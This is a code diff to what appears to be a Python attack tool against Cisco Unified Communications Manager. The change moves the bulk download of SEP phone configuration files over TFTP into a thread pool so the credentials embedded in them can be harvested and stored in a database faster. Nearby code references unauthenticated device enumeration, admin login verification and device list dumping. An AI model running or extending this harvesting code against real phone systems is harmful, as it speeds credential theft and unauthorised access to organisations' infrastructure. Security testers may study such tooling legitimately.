@@ -15,6 +15,7 @@ import sqlite3
 import time
 import threading
 import queue
+import concurrent.futures
 import random
 import secrets
 from datetime import datetime
@@ -1328,20 +1329,44 @@ def enumerate_devices_unauthenticated(cucm_host, port, usernames, db_file, threa
     return found_count
 
 
-def download_uds_discovered_configs(cucm_host, device_names, db_file, use_tftp=True, no_db=False):
+def download_uds_discovered_configs(cucm_host, device_names, db_file, use_tftp=True,
+                                    no_db=False, threads=10):
     """
-    Download and parse SEP config files for devices discovered via UDS.
-    Logs any credentials found to the DB unless no_db is True.
+    Download and parse SEP config files for devices discovered via UDS or the
+    CCMAdmin device dump. Logs any credentials found to the DB unless no_db.
     Returns the count of configs that yielded at least one credential.
+
+    The per-device config fetches are network-bound and run in a thread pool of
+    up to `threads` workers (capped at the device count), which is a large
+    speed-up over the old serial loop when there are thousands of devices. DB
+    writes and the hit count stay in this (single) calling thread as results
+    arrive, so SQLite sees one writer and credentials persist incrementally as
+    the run proceeds. On an exception (e.g. KeyboardInterrupt) outstanding fetches
+    are cancelled rather than drained, so Ctrl-C returns promptly with whatever
+    was already written.
     """
+    device_names = list(device_names)
+    if not device_names:
+        return 0
+
+    def fetch(device_name):
+        return search_for_secrets(cucm_host, f'{device_name}.cnf.xml', use_tftp=use_tftp)
+
     hits = 0
-    for device_name in device_names:
-        filename = f'{device_name}.cnf.xml'
-        creds, users = search_for_secrets(cucm_host, filename, use_tftp=use_tftp)
-        if not no_db and (creds or users):
-            log_credentials_to_db(cucm_host, creds, users, db_file)
-        if creds:
-            hits += 1
+    worker_count = max(1, min(threads, len(device_names)))
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=worker_count)
+    try:
+        # executor.map preserves input order and yields results here in the main
+        # thread, so the DB writes below are serialised without a lock.
+        for creds, users in executor.map(fetch, device_names):
+            if not no_db and (creds or users):
+                log_credentials_to_db(cucm_host, creds, users, db_file)
+            if creds:
+                hits += 1
+    finally:
+        # wait=False + cancel_futures so an interrupt mid-run doesn't block on the
+        # remaining queued downloads (potentially thousands at a 5s TFTP timeout).
+        executor.shutdown(wait=False, cancel_futures=True)
     return hits
 
 
@@ -1807,7 +1832,7 @@ def _verify_worker(work_queue, results, port, db_file, timeout=10, _login_fn=Non
 
 
 def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True,
-               use_tftp=True, _dump_fn=None, _download_fn=None):
+               use_tftp=True, download_threads=10, _dump_fn=None, _download_fn=None):
     """
     Top-level orchestrator for --verify.
 
@@ -1881,7 +1906,8 @@ def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True,
             # directly (no MAC brute force) and harvest any embedded credentials.
             if device_names:
                 print(f'[+] {host}: downloading {len(device_names)} device config(s)...')
-                hits = _download_fn(host, device_names, db_file, use_tftp=use_tftp)
+                hits = _download_fn(host, device_names, db_file, use_tftp=use_tftp,
+                                    threads=download_threads)
                 print(f'[+] {host}: config download complete, '
                       f'{hits}/{len(device_names)} config(s) yielded credentials')
 
@@ -3134,7 +3160,7 @@ def main():
     parser.add_argument('--verify-port', type=int, default=8443,
                         help='CCMAdmin HTTPS port for --verify (default: 8443; some clusters use 443)')
     parser.add_argument('--verify-threads', type=int, default=10,
-                        help='Concurrent verification workers (default: 10)')
+                        help='Concurrent workers for --verify, covering both login attempts and the follow-on device config downloads (default: 10)')
     parser.add_argument('--no-device-dump', action='store_true', default=False,
                         help='With --verify, skip pulling the SEP device list (AXL/CCMAdmin) from hosts with valid admin access')
 
@@ -3329,6 +3355,7 @@ def main():
             db_file=db_file,
             dump_devices=not args.no_device_dump,
             use_tftp=use_tftp,
+            download_threads=args.verify_threads,
         )
         quit(0)
 
@@ -3454,6 +3481,7 @@ def main():
                     conn.close()
                     hits = download_uds_discovered_configs(
                         CUCM_host, device_names, db_file, use_tftp=use_tftp,
+                        threads=threads,
                     )
                     print(f'[+] Config download complete: {hits}/{len(device_names)} configs yielded credentials')
                 else:
